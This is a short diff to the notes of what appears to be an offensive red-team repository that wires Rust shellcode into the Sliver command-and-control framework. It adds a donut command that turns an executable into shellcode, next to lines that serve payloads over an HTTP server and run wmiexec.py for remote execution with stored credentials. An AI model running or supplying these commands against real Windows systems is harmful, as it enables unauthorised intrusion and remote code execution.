@@ -4,8 +4,10 @@ I just weaponized with Sliver the awesome work done in this repo:
 
 usefull commands (for me):
 ```
+python3 -c "import donut;a=donut.create(file='kaboum_exe.exe',arch=2)"
 sudo python3 -m http.server 80
-cd /rust-shellcode/target/x86_64-pc-windows-gnu/release/ ;  watch -n1 "ls *exe -lah
+cd ~/rust-shellcode/target/x86_64-pc-windows-gnu/debug/ ;  watch -n1 "ls *exe -lah
+cd ~/rust-shellcode/target/x86_64-pc-windows-gnu/release/ ;  watch -n1 "ls *exe -lah
 wmiexec.py $(cat ~/.exec)
 ```
 
